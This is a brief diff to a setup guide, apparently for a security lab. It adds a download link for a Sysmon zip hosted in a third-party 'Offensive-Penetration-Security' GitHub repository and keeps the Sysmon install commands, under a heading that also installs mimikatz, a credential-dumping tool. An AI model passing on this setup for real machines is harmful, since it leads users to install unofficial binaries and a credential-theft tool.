@@ -3,6 +3,10 @@
 - - - Install Sysmon + mimikatz.exe:
 
 Launch CMD with administrator privileges in the Sysmon folder and install the file with the following command:
+- Download:
+
+[Link](https://github.com/Offensive-Penetration-Security/Sysmon_by_OPSEC/raw/main/Sysmon.zip)
+
 ```cmd
 Sysmon64.exe -accepteula -i sysmon.xml
 Sysmon64.exe -i sysmon.xml
